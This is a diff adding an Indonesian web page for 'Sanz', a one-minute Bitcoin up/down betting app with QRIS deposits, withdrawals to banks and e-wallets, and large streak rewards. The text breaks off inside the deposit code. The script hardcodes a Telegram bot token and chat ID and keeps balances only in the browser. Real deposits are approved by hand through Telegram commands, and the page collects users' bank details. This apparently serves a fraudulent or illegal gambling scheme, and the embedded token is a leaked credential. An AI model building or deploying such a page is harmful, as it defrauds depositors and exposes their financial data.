@@ -1,0 +1,1003 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sanz</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background-color: #121212; color: #e0e0e0; display: flex; justify-content: center; }
+        .app-container { width: 100%; max-width: 480px; background-color: #121212; min-height: 100vh; position: relative; padding-bottom: 30px; }
+        
+        .prediction-card, .chart-card, .bet-panel, .history-item, .global-history-card, .winstreak-card { 
+            background: #1e1e1e; border-radius: 20px; margin: 20px 15px; padding: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.5); 
+        }
+
+        .balance-card {
+            background: #1e1e1e; border-radius: 20px; 
+            margin: 20px 15px; padding: 22px; box-shadow: 0 8px 25px rgba(0,0,0,0.5);  position: relative; overflow: hidden;
+        }
+  
+        .balance-header { position: relative; z-index: 1; margin-bottom: 22px; }
+        .balance-label { display: flex; justify-content: space-between; align-items: center; color: #fff; font-size: 13px; font-weight: 600; }
+        .balance-label strong { background: rgba(0,0,0,0.3); padding: 4px 10px; border-radius: 8px; font-weight: 600; color: #e0e0e0; border: 1px solid rgba(255,255,255,0.05); }
+        .balance-amount-wrapper { display: flex; align-items: center; gap: 12px; margin-top: 10px; }
+        .balance-amount { font-size: 27px; font-weight: 800; color: #fff; letter-spacing: -0.5px; }
+        
+        .balance-actions { display: flex; gap: 10px; position: relative; z-index: 1; }
+        .btn-action { flex: 1; padding: 12px; border-radius: 12px; border: none; font-weight: 600; font-size: 14px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: transform 0.1s; }
+        .btn-action:active { transform: scale(0.96); }
+        .btn-deposit { background: #fff; color: #111; box-shadow: 0 4px 15px rgba(255,255,255,0.1); }
+        .btn-withdraw { background: rgba(0,0,0,0.4); color: #fff; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(5px); }
+        
+        .card-title { text-align: center; font-weight: 600; font-size: 17px; margin-bottom: 20px; color: #fff; padding-bottom: 15px; border-bottom: 1px solid #333; }
+        .status-row { display: flex; justify-content: space-between; margin-bottom: 20px; }
+        .status-item { display: flex; flex-direction: column; }
+        .status-label { font-size: 12px; color: #aaa; margin-bottom: 5px; }
+        .status-value { font-size: 18px; font-weight: 700; color: #ccc; }
+        .status-value.bullish { color: #00e676; }
+        .status-value.bearish { color: #ff5252; }
+        .status-value.timer { font-size: 18px; font-weight: 700; color: #fff; text-align: right; transition: color 0.3s ease; }
+        .timer.paused { color: #ff9800; }
+
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; background: #2a2a2a; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
+        .info-col { display: flex; flex-direction: column; }
+        .info-col:nth-child(2) { align-items: center; }
+        .info-col:nth-child(3) { align-items: flex-end; }
+        .info-label { font-size: 11px; color: #aaa; margin-bottom: 4px; }
+        .info-val { font-size: 13px; font-weight: 600; color: #fff; }
+
+        .price-row { display: flex; justify-content: space-between; align-items: center; }
+        .price-col { display: flex; flex-direction: column; }
+        .price-col:last-child { text-align: right; }
+        .price-val { font-size: 15px; font-weight: 700; color: #fff; transition: color 0.1s ease; }
+        .price-val.up { color: #00e676; }
+        .price-val.down { color: #ff5252; }
+        .price-arrows { color: #555; font-size: 16px; }
+
+        .chart-card { height: 180px; padding: 15px; }
+        
+        .sentiment-labels { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; font-weight: 600; }
+        .buy-label { color: #00e676; }
+        .sell-label { color: #ff5252; }
+        .progress-bar-container { display: flex; height: 8px; border-radius: 10px; overflow: hidden; background: #2a2a2a; }
+        .progress-buy { background: #00e676; transition: width 0.3s ease; }
+        .progress-sell { background: #ff5252; transition: width 0.3s ease; }
+        .global-trade-list { margin-top: 15px; display: flex; flex-direction: column; gap: 8px; }
+        .global-trade-item { display: flex; justify-content: space-between; font-size: 12px; padding: 8px 10px; background: #2a2a2a; border-radius: 8px; align-items: center; }
+        .g-trade-time { color: #888; font-size: 10px; width: 60px; }
+        .g-trade-price { font-weight: 600; width: 85px; }
+        .g-trade-qty { color: #ccc; text-align: right; flex: 1; }
+        .g-buy { color: #00e676; }
+        .g-sell { color: #ff5252; }
+
+        .ws-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .ws-title { font-weight: 700; color: #ff9800; font-size: 15px; display: flex; align-items: center; gap: 6px; }
+        .ws-count { font-weight: 700; color: #fff; font-size: 18px; }
+        .ws-list { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
+        .ws-item { display: flex; justify-content: space-between; font-size: 12px; padding: 10px 12px; background: #2a2a2a; border-radius: 8px; color: #888; font-weight: 600; transition: all 0.3s ease; }
+        .ws-item.passed { color: #00e676; border: 1px solid #00e676; background: rgba(0, 230, 118, 0.1); box-shadow: 0 0 10px rgba(0, 230, 118, 0.2); }
+        .ws-item.passed i { color: #00e676; }
+        .ws-info { display: flex; flex-direction: column; gap: 12px; text-align: center; }
+        .ws-info p { font-size: 12px; color: #aaa; margin: 0; }
+        .btn-claim { width: 100%; padding: 12px; border-radius: 8px; border: none; font-weight: 700; font-size: 14px; cursor: not-allowed; transition: all 0.3s ease; background: #333; color: #777; }
+        .btn-claim.active { background: #00e676; color: #111; cursor: pointer; box-shadow: 0 4px 15px rgba(0, 230, 118, 0.3); transform: scale(1); }
+        .btn-claim.active:active { transform: scale(0.97); }
+
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: block; font-size: 12px; color: #aaa; margin-bottom: 6px; font-weight: 500; text-align: left; }
+        .input-group input, .input-group select { width: 100%; padding: 12px; background: #2a2a2a; color: #fff; border: 1px solid #444; border-radius: 8px; font-size: 15px; font-weight: 600; outline: none; }
+        
+        .predict-buttons { display: flex; gap: 10px; }
+        .btn-predict { flex: 1; padding: 14px; border-radius: 8px; border: none; font-weight: 700; font-size: 15px; color: #fff; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: transform 0.1s; }
+        .btn-predict:active { transform: scale(0.96); }
+        .btn-up { background: #00b873; }
+        .btn-down { background: #ff4d4d; }
+
+        .streak-section { padding: 0 15px; }
+        .streak-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .streak-header h3 { font-size: 15px; font-weight: 600; color: #fff; }
+        .streak-header a { font-size: 12px; color: #888; text-decoration: none; cursor: pointer; }
+        .history-list { display: flex; flex-direction: column; gap: 10px; margin-top: 10px; }
+        
+        .history-item { display: flex; align-items: center; justify-content: space-between; padding: 15px; margin: 0; }
+        .hist-info { flex: 1; margin-left: 15px; }
+        .hist-info h4 { font-size: 13px; font-weight: 600; margin-bottom: 3px; color: #fff; }
+        .hist-info p { font-size: 11px; color: #aaa; }
+        .hist-prices { font-size: 10px; color: #888; margin-top: 4px; }
+        .hist-result { text-align: right; }
+        .hist-result h4 { font-size: 14px; font-weight: 700; margin-bottom: 2px; }
+        .hist-result p { font-size: 12px; font-weight: 600; }
+        
+        .win-text { color: #00e676; }
+        .lose-text { color: #ff5252; }
+        .wait-text { color: #ffffff; }
+
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 9999; opacity: 0; transition: opacity 0.3s ease; }
+        .modal-overlay.show { display: flex; opacity: 1; }
+        .modal-content { background: #1e1e1e; width: 90%; max-width: 360px; padding: 25px 20px; border-radius: 20px; text-align: center; transform: translateY(20px); transition: transform 0.3s ease; box-shadow: 0 15px 30px rgba(0,0,0,0.5); border: 1px solid #333; max-height: 90vh; overflow-y: auto;}
+        .modal-overlay.show .modal-content { transform: translateY(0); }
+        .modal-icon { font-size: 50px; margin-bottom: 10px; }
+        .modal-title { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 10px; }
+        .modal-desc { font-size: 14px; color: #aaa; margin-bottom: 20px; line-height: 1.5; }
+        .btn-modal { width: 100%; padding: 12px; background: #fff; color: #111; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; margin-top: 10px;}
+        .btn-modal-outline { background: transparent; color: #fff; border: 1px solid #555; }
+        .btn-modal-danger { background: transparent; color: #ff5252; border: 1px solid #ff5252; }
+
+        .saved-card { background: #2a2a2a; padding: 15px; border-radius: 10px; border: 1.5px dashed #e0e0e0; margin-bottom: 15px; text-align: left; }
+        .qris-box { background: #fff; padding: 10px; border-radius: 10px; margin: 15px 0; display: none; }
+        .qris-box img { width: 100%; border-radius: 5px; }
+        .loading-spinner { border: 4px solid #333; border-top: 4px solid #00e676; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .instruction-box { font-size: 12px; color: #aaa; text-align: left; background: #2a2a2a; padding: 12px; border-radius: 8px; margin-bottom: 15px; display: none; }
+
+        .history-modal-content { background: #121212; width: 100%; max-width: 480px; height: 100vh; padding: 20px; display: flex; flex-direction: column; transform: translateY(100%); transition: transform 0.3s ease; }
+        .modal-overlay.show .history-modal-content { transform: translateY(0); }
+        .history-modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 15px; }
+        .history-modal-header h2 { font-size: 18px; color: #fff; }
+        .btn-close-history { background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; }
+        .full-history-list { flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; padding-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <div class="balance-card">
+            <div class="balance-header">
+                <span class="balance-label">
+                    Total Saldo 
+                    <strong id="user-id-display">UID: Loading...</strong>
+                </span>
+                <div class="balance-amount-wrapper">
+                    <span class="balance-amount" id="balance-display">Rp 0</span>
+                </div>
+            </div>
+            <div class="balance-actions">
+                <button class="btn-action btn-deposit" onclick="openDepositModal()">
+                    <i class="bi bi-wallet2"></i> Isi Saldo
+                </button>
+                <button class="btn-action btn-withdraw" onclick="openWithdrawModal()">
+                    <i class="bi bi-cash-stack"></i> Penarikan
+                </button>
+            </div>
+        </div>
+        
+        <div class="prediction-card">
+            <div class="card-title">Bitcoin</div>
+            <div class="status-row">
+                <div class="status-item">
+                    <span class="status-label">Prediksi ditempatkan</span>
+                    <span class="status-value" id="view-direction">-</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label" style="text-align: right;">Hasil akhir</span>
+                    <span class="status-value timer" id="view-timer">00:00:00</span>
+                </div>
+            </div>
+            <div class="info-grid">
+                <div class="info-col"><span class="info-label">Simbol</span><span class="info-val">BTC/USDT</span></div>
+                <div class="info-col"><span class="info-label">Taruhan</span><span class="info-val" id="view-bet-display">Rp 0</span></div>
+                <div class="info-col"><span class="info-label">Periode</span><span class="info-val">1 Menit</span></div>
+            </div>
+            <div class="price-row">
+                <div class="price-col"><span class="info-label">Prediksi harga</span><span class="price-val" id="view-entry-price">0.00</span></div>
+                <div class="price-arrows"><i class="bi bi-arrow-left-right"></i></div>
+                <div class="price-col"><span class="info-label">Harga referensi</span><span class="price-val" id="view-live-price">Loading...</span></div>
+            </div>
+        </div>
+
+        <div class="chart-card">
+            <canvas id="liveChart"></canvas>
+        </div>
+
+        <div class="global-history-card">
+            <div class="sentiment-labels">
+                <span class="buy-label"><i class="bi bi-caret-up-fill"></i> Pembelian <span id="buy-percent-text">50%</span></span>
+                <span class="sell-label"><span id="sell-percent-text">50%</span> Penjualan <i class="bi bi-caret-down-fill"></i></span>
+            </div>
+            <div class="progress-bar-container">
+                <div class="progress-buy" id="progress-buy" style="width: 50%;"></div>
+                <div class="progress-sell" id="progress-sell" style="width: 50%;"></div>
+            </div>
+            <div class="global-trade-list" id="global-trade-list"></div>
+        </div>
+
+        <div class="bet-panel" id="action-panel">
+            <div class="input-group">
+                <label>Jumlah Taruhan (Rp)</label>
+                <input type="number" id="bet-input" value="50000" min="10000" step="5000">
+            </div>
+            <div class="predict-buttons">
+                <button class="btn-predict btn-up" onclick="executeTrade('Naik')"><i class="bi bi-graph-up-arrow"></i> Naik</button>
+                <button class="btn-predict btn-down" onclick="executeTrade('Turun')"><i class="bi bi-graph-down-arrow"></i> Turun</button>
+            </div>
+        </div>
+
+        <div class="winstreak-card">
+            <div class="ws-header">
+                <span class="ws-title"><i class="bi bi-fire"></i> Winstreak Reward</span>
+                <span class="ws-count" id="ws-count-display">0x</span>
+            </div>
+            <div class="ws-list" id="ws-list">
+                <div class="ws-item" id="ws-item-5"><span><i class="bi bi-circle-fill" style="font-size: 8px; margin-right:5px;"></i> 5x Benar</span><span>Rp 10.000</span></div>
+                <div class="ws-item" id="ws-item-15"><span><i class="bi bi-circle-fill" style="font-size: 8px; margin-right:5px;"></i> 15x Benar</span><span>Rp 50.000</span></div>
+                <div class="ws-item" id="ws-item-37"><span><i class="bi bi-circle-fill" style="font-size: 8px; margin-right:5px;"></i> 37x Benar</span><span>Rp 700.000</span></div>
+                <div class="ws-item" id="ws-item-68"><span><i class="bi bi-circle-fill" style="font-size: 8px; margin-right:5px;"></i> 68x Benar</span><span>Rp 5.000.000</span></div>
+                <div class="ws-item" id="ws-item-120"><span><i class="bi bi-circle-fill" style="font-size: 8px; margin-right:5px;"></i> 120x Benar</span><span>Rp 20.000.000</span></div>
+            </div>
+            <div class="ws-info">
+                <p id="ws-target-text">Benar 5x beruntun untuk claim Rp 10.000</p>
+                <button class="btn-claim" id="btn-claim-ws" onclick="claimWinstreak()" disabled>Belum Tersedia</button>
+            </div>
+        </div>
+
+        <div class="streak-section">
+            <div class="streak-header">
+                <h3>Riwayat Transaksi</h3>
+                <a onclick="showFullHistory()">Lihat Semua ></a>
+            </div>
+            <div class="history-list" id="history-box"></div>
+        </div>
+    </div>
+
+    <div id="deposit-modal" class="modal-overlay">
+        <div class="modal-content">
+            <h3 style="color:#fff; margin-bottom:20px;">Isi Saldo (Deposit)</h3>
+            
+            <div id="deposit-step-1">
+                <div class="input-group">
+                    <label>Nominal Deposit (Min. Rp 50.000)</label>
+                    <input type="number" id="deposit-amount" placeholder="Contoh: 50000">
+                </div>
+                <button class="btn-modal" onclick="requestDeposit()">Konfirmasi</button>
+                <button class="btn-modal btn-modal-outline" onclick="closeTargetModal('deposit-modal')">Batal</button>
+            </div>
+
+            <div id="deposit-step-2" style="display:none;">
+                <p style="color:#00e676; font-weight:bold; font-size:18px;" id="deposit-amount-display">Rp 0</p>
+                
+                <div id="qris-loading">
+                    <div class="loading-spinner"></div>
+                    <p style="color:#aaa; font-size:12px; margin-bottom:15px;" id="qris-status-text">
+                    </p>
+                </div>
+
+                <div id="qris-ready" class="qris-box">
+                    <img id="qris-image-tag" src="" alt="QRIS">
+                </div>
+
+                <div id="qris-instruction" class="instruction-box">
+                    <strong>Cara Pembayaran:</strong><br>
+                    1. Scan QRIS pada M-Banking / E-Wallet.<br>
+                    2. Pastikan nominal transfer sesuai.<br>
+                    3. Saldo otomatis diproses setelah transfer berhasil.<br>
+                    <span style="color:#ff5252; margin-top:5px; display:block; font-weight:bold;" id="deposit-timer">Kedaluwarsa dalam: 15:00</span>
+                </div>
+                
+                <button class="btn-modal" id="btn-close-deposit" onclick="closeTargetModal('deposit-modal')">Tutup Halaman</button>
+                <button class="btn-modal btn-modal-danger" id="btn-cancel-deposit" onclick="cancelDeposit()">Batalkan Request</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="withdraw-modal" class="modal-overlay">
+        <div class="modal-content">
+            <h3 style="color:#fff; margin-bottom:20px;">Penarikan (Withdraw)</h3>
+            <div id="wd-setup-bank">
+                <div class="input-group">
+                    <label>Pilih Bank / E-Wallet</label>
+                    <select id="bank-provider">
+                        <option value="DANA">DANA</option><option value="OVO">OVO</option>
+                        <option value="GoPay">GoPay</option><option value="ShopeePay">ShopeePay</option>
+                        <option value="BCA">Bank BCA</option><option value="BRI">Bank BRI</option><option value="SeaBank">SeaBank</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>Nama Pemilik Akun</label>
+                    <input type="text" id="bank-name" placeholder="Sesuai KTP / Akun">
+                </div>
+                <div class="input-group">
+                    <label>Nomor Rekening / HP</label>
+                    <input type="number" id="bank-number" placeholder="Contoh: 08123456789">
+                </div>
+                <button class="btn-modal" onclick="saveBankDetails()">Simpan Rekening</button>
+            </div>
+
+            <div id="wd-form" style="display:none;">
+                <div class="saved-card">
+                    <div style="font-size:11px; color:#aaa; margin-bottom:5px;"></div>
+                    <div style="color:#fff; font-weight:bold; font-size:14px;" id="saved-bank-name">NAMA</div>
+                    <div style="color:#00e676; font-size:13px; font-weight:600;"><span id="saved-bank-provider">BANK</span> - <span id="saved-bank-number">123</span></div>
+                    <a href="#" style="font-size:11px; color:#ff5252; text-decoration:none; display:inline-block; margin-top:8px;" onclick="resetBankDetails()">Hapus rekening</a>
+                </div>
+                <div class="input-group">
+                    <label>Nominal Penarikan (Min. Rp 50.000)</label>
+                    <input type="number" id="wd-amount" placeholder="Tersedia: Rp 0" oninput="checkWdBalance()">
+                </div>
+                <button class="btn-modal" id="btn-submit-wd" onclick="submitWithdraw()">Tarik Saldo</button>
+            </div>
+            <button class="btn-modal btn-modal-outline" onclick="closeTargetModal('withdraw-modal')">Batal</button>
+        </div>
+    </div>
+
+    <div id="custom-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-icon" id="modal-icon"></div>
+            <div class="modal-title" id="modal-title">Info</div>
+            <div class="modal-desc" id="modal-desc">Pesan</div>
+            <button class="btn-modal" onclick="closeInfoModal()">Tutup</button>
+        </div>
+    </div>
+
+    <div id="history-modal" class="modal-overlay">
+        <div class="history-modal-content">
+            <div class="history-modal-header">
+                <h2>Semua Riwayat Transaksi</h2>
+                <button class="btn-close-history" onclick="closeFullHistory()"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div class="full-history-list" id="full-history-list"></div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8765727817:AAEzCv9z6n1OrAzEll_DdHM-lO2fpeL__oY'; 
+        const CHAT_ID = '8893393746';
+
+        let savedBalance = localStorage.getItem('sanz_balance');
+        let userBalance = savedBalance ? parseFloat(savedBalance) : 0; 
+        
+        let savedHistory = localStorage.getItem('sanz_history');
+        let tradeHistory = savedHistory ? JSON.parse(savedHistory) : []; 
+        
+        let savedWinstreak = localStorage.getItem('sanz_winstreak');
+        let winstreakCount = savedWinstreak ? parseInt(savedWinstreak) : 0;
+        
+        let globalPrice = 0, lastPrice = 0, activeTrading = false, timerCount = 60, intervals = null;
+        let bWS = null, lastWsMsgTime = Date.now();
+        let tradeSession = { id: null, type: '', side: '', amount: 0, entry: 0 };
+        
+        let telegramPollInterval = null;
+        let depositTimerInterval = null;
+        let lastTgUpdateId = parseInt(localStorage.getItem('sanz_last_tg_update_id') || '0');
+        
+        let isPolling = false;
+
+        const wsMilestones = { 5: 10000, 15: 50000, 37: 700000, 68: 5000000, 120: 20000000 };
+        const wsKeys = [5, 15, 37, 68, 120];
+        let currentClaimable = 0;
+
+        const elLivePrice = document.getElementById('view-live-price');
+        const elBalance = document.getElementById('balance-display');
+        const elDirection = document.getElementById('view-direction');
+        const elTimer = document.getElementById('view-timer');
+        const elBetDisplay = document.getElementById('view-bet-display');
+        const elEntryPrice = document.getElementById('view-entry-price');
+        const elHistoryBox = document.getElementById('history-box');
+        const elFullHistoryList = document.getElementById('full-history-list');
+
+        let userID = localStorage.getItem('trading_uid');
+        if(!userID) {
+            userID = 'UID-' + Math.floor(100000 + Math.random() * 900000);
+            localStorage.setItem('trading_uid', userID);
+        }
+        document.getElementById('user-id-display').innerText = userID;
+
+        function saveChartAndSentiment() {
+            localStorage.setItem('sanz_chart_data', JSON.stringify(priceChart.data.datasets[0].data));
+            localStorage.setItem('sanz_sentiment', JSON.stringify(rollingTrades));
+        }
+        window.addEventListener('beforeunload', saveChartAndSentiment);
+        setInterval(saveChartAndSentiment, 3000);
+
+        function saveDataLocally() {
+            localStorage.setItem('sanz_balance', userBalance);
+            localStorage.setItem('sanz_history', JSON.stringify(tradeHistory));
+            localStorage.setItem('sanz_winstreak', winstreakCount);
+            if (activeTrading) {
+                const activeData = { ...tradeSession, endTime: Date.now() + (timerCount * 1000) };
+                localStorage.setItem('sanz_active_trade', JSON.stringify(activeData));
+            } else { localStorage.removeItem('sanz_active_trade'); }
+            saveChartAndSentiment();
+        }
+
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`).catch(err=>console.error(err));
+        }
+
+        function openTargetModal(id) { const el = document.getElementById(id); el.style.display = 'flex'; setTimeout(() => el.classList.add('show'), 10); }
+        function closeTargetModal(id) { const el = document.getElementById(id); el.classList.remove('show'); setTimeout(() => el.style.display = 'none', 300); }
+        function formatIDR(num) { return new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(num); }
+
+        function showModal(title, text, type) {
+            const overlay = document.getElementById('custom-modal');
+            document.getElementById('modal-title').innerText = title; document.getElementById('modal-desc').innerHTML = text; 
+            const iconEl = document.getElementById('modal-icon');
+            if (type === 'win') iconEl.innerHTML = '<i class="bi bi-check-circle-fill" style="color: #00e676;"></i>';
+            else if (type === 'lose') iconEl.innerHTML = '<i class="bi bi-x-circle-fill" style="color: #ff5252;"></i>';
+            else if (type === 'error') iconEl.innerHTML = '<i class="bi bi-exclamation-triangle-fill" style="color: #ff9800;"></i>';
+            else iconEl.innerHTML = '<i class="bi bi-info-circle-fill" style="color: #2196f3;"></i>';
+            overlay.style.display = 'flex'; setTimeout(() => { overlay.classList.add('show'); }, 10);
+        }
+        function closeInfoModal() { const overlay = document.getElementById('custom-modal'); overlay.classList.remove('show'); setTimeout(() => { overlay.style.display = 'none'; }, 300); }
+        function showFullHistory() { const overlay = document.getElementById('history-modal'); overlay.style.display = 'flex'; setTimeout(() => { overlay.classList.add('show'); }, 10); }
+        function closeFullHistory() { const overlay = document.getElementById('history-modal'); overlay.classList.remove('show'); setTimeout(() => { overlay.style.display = 'none'; }, 300); }
+
+        async function startTelegramPolling(targetUID) {
+            if (telegramPollInterval) clearInterval(telegramPollInterval);
+            
+            telegramPollInterval = setInterval(async () => {
+
+                if (isPolling) return;
+                isPolling = true;
+
+                try {
+                    let activeDeposit = JSON.parse(localStorage.getItem('sanz_active_deposit')); 
+                    let activeWithdraw = JSON.parse(localStorage.getItem('sanz_active_withdraw'));
+
+                    if (!activeDeposit && !activeWithdraw) {
+                        clearInterval(telegramPollInterval);
+                        isPolling = false;
+                        return;
+                    }
+
+                    let offsetParam = lastTgUpdateId > 0 ? `?offset=${lastTgUpdateId + 1}` : '';
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates${offsetParam}`);
+                    const data = await res.json();
+                    
+                    if (!data.ok || !data.result || data.result.length === 0) {
+                        isPolling = false;
+                        return;
+                    }
+
+                    for (let update of data.result) {
+                        lastTgUpdateId = update.update_id;
+                        localStorage.setItem('sanz_last_tg_update_id', lastTgUpdateId);
+
+                        const msg = update.message;
+                        if (!msg) continue; 
+                        
+                        activeDeposit = JSON.parse(localStorage.getItem('sanz_active_deposit')); 
+                        activeWithdraw = JSON.parse(localStorage.getItem('sanz_active_withdraw'));
+                        
+                        let checkTime = Math.min(
+                            activeDeposit ? activeDeposit.startTime : Infinity, 
+                            activeWithdraw ? activeWithdraw.startTime : Infinity
+                        );
+                        if (msg.date < checkTime) continue; 
+                        
+                        const text = msg.text || msg.caption || '';
+
+                        if (activeDeposit && activeDeposit.status === 'Menunggu') {
+                            if (text.includes('/acc') && text.includes(targetUID) && !text.includes('/acc_wd')) {
+
+                                if (!localStorage.getItem('sanz_active_deposit')) continue;
+                                localStorage.removeItem('sanz_active_deposit');
+
+                                let parts = text.split(' ');
+                                let accAmount = parseInt(parts[1]);
+                                if (isNaN(accAmount)) accAmount = activeDeposit.amount;
+                                
+                                userBalance += accAmount;
+                                elBalance.innerText = formatIDR(userBalance);
+                                
+                                if (depositTimerInterval) clearInterval(depositTimerInterval);
+
+                                document.getElementById('deposit-amount-display').style.display = 'none';
+                                document.getElementById('qris-ready').style.display = 'none';
+                                document.getElementById('qris-instruction').style.display = 'none';
+                                document.getElementById('btn-close-deposit').style.display = 'none';
+                                document.getElementById('btn-cancel-deposit').style.display = 'none';
+                                
+                                let loadingEl = document.getElementById('qris-loading');
+                                loadingEl.style.display = 'block';
+                                loadingEl.innerHTML = `
+                                    <div style="font-size: 55px; color: #00e676; margin-bottom: 10px;">
+                                        <i class="bi bi-check-circle-fill"></i>
+                                    </div>
+                                    <p style="color:#00e676; font-weight:bold; font-size:18px;">Pembayaran Berhasil!</p>
+                                    <p style="color:#fff; font-size:14px; margin-top:5px;">Saldo ${formatIDR(accAmount)} ditambahkan.</p>
+                                `;
+
+                                updateDepositHistoryStatus(targetUID, "Berhasil", accAmount);
+                                activeDeposit = null; 
+                                saveDataLocally();
+
+                                sendToTelegram(`*PEMBAYARAN BERHASIL*\n\nSaldo sebesar Rp ${accAmount.toLocaleString('id-ID')} telah berhasil ditambahkan ke akun \`${targetUID}\`.`);
+                                setTimeout(() => { closeTargetModal('deposit-modal'); }, 2500);
+                            }
+                            else if (text.includes('/tolak') && text.includes(targetUID) && !text.includes('/tolak_wd')) {
+                                if (!localStorage.getItem('sanz_active_deposit')) continue;
+                                localStorage.removeItem('sanz_active_deposit');
+
+                                if (depositTimerInterval) clearInterval(depositTimerInterval);
+                                
+                                document.getElementById('deposit-amount-display').style.display = 'none';
+                                document.getElementById('qris-ready').style.display = 'none';
+                                document.getElementById('qris-instruction').style.display = 'none';
+                                document.getElementById('btn-close-deposit').style.display = 'none';
+                                document.getElementById('btn-cancel-deposit').style.display = 'none';
+
+                                let loadingEl = document.getElementById('qris-loading');
+                                loadingEl.style.display = 'block';
+                                loadingEl.innerHTML = `
+                                    <div style="font-size: 55px; color: #ff5252; margin-bottom: 10px;">
+                                        <i class="bi bi-x-circle-fill"></i>
+                                    </div>
+                                    <p style="color:#ff5252; font-weight:bold; font-size:16px;"></p>
+                                `;
+                                
+                                updateDepositHistoryStatus(targetUID, "Dibatalkan");
+                                activeDeposit = null;
+                                saveDataLocally();
+
+                                sendToTelegram(`*DEPOSIT DITOLAK*\n\nPermintaan deposit dari \`${targetUID}\` telah dibatalkan.`);
+                                setTimeout(() => { closeTargetModal('deposit-modal'); }, 2500);
+                            }
+                            else if (text.includes('/send') && text.includes(targetUID) && msg.photo) {
+                                const photo = msg.photo[msg.photo.length - 1]; 
+                                fetchQRImage(photo.file_id, activeDeposit);
+                            }
+                        }
+
+                        if (activeWithdraw && activeWithdraw.status === 'Menunggu') {
+                            if (text.includes('/acc_wd') && text.includes(targetUID)) {
+                                if (!localStorage.getItem('sanz_active_withdraw')) continue;
+                                localStorage.removeItem('sanz_active_withdraw');
+
+                                let wdAmt = activeWithdraw.amount; 
+                                updateWithdrawHistoryStatus(activeWithdraw.id, "Berhasil");
+                                showModal("Penarikan Berhasil", `Penarikan saldo sebesar ${formatIDR(wdAmt)} telah berhasil diproses.`, "win");
+                                sendToTelegram(`*PENARIKAN BERHASIL*\n\nPenarikan saldo Rp ${wdAmt.toLocaleString('id-ID')} untuk \`${targetUID}\` berhasil dikonfirmasi.`);
+                                
+                                activeWithdraw = null; 
+                            }
+                            else if (text.includes('/tolak_wd') && text.includes(targetUID)) {
+                                if (!localStorage.getItem('sanz_active_withdraw')) continue;
+                                localStorage.removeItem('sanz_active_withdraw');
+
+                                let wdAmt = activeWithdraw.amount;
+                                updateWithdrawHistoryStatus(activeWithdraw.id, "Dibatalkan");
+                                
+                                userBalance += wdAmt; 
+                                elBalance.innerText = formatIDR(userBalance);
+                                saveDataLocally();
+                                
+                                showModal("Penarikan Ditolak", `Permintaan ditolak saldo sebesar ${formatIDR(wdAmt)} telah dikembalikan ke akun Anda.`, "error");
+                                sendToTelegram(`*PENARIKAN DITOLAK*\n\nPenarikan saldo untuk \`${targetUID}\` ditolak. Dana telah dikembalikan ke akun user.`);
+                                
+                                activeWithdraw = null;
+                            }
+                        }
+                    }
+                } catch (e) { 
+                    console.error("Gagal polling API", e); 
+                } finally {
+                    isPolling = false; 
+                }
+            }, 3000); 
+        }
+
+        function openDepositModal() { 
+            let activeDeposit = JSON.parse(localStorage.getItem('sanz_active_deposit')); 
+            if (activeDeposit && activeDeposit.status === 'Menunggu' && (activeDeposit.endTime ? activeDeposit.endTime > Date.now() : true)) {
+                document.getElementById('deposit-step-1').style.display = 'none'; 
+                document.getElementById('deposit-step-2').style.display = 'block';
+                document.getElementById('deposit-amount-display').style.display = 'block';
+                document.getElementById('deposit-amount-display').innerText = formatIDR(activeDeposit.amount);
+                
+                document.getElementById('btn-close-deposit').style.display = 'inline-block';
+                document.getElementById('btn-cancel-deposit').style.display = 'inline-block';
+
+                if (activeDeposit.qrUrl) {
+                    showQR(activeDeposit.qrUrl, activeDeposit, true);
+                } else {
+                    document.getElementById('qris-loading').style.display = 'block';
+                    document.getElementById('qris-ready').style.display = 'none';
+                    document.getElementById('qris-instruction').style.display = 'none';
+                    document.getElementById('qris-loading').innerHTML = `
+                        <div class="loading-spinner"></div>
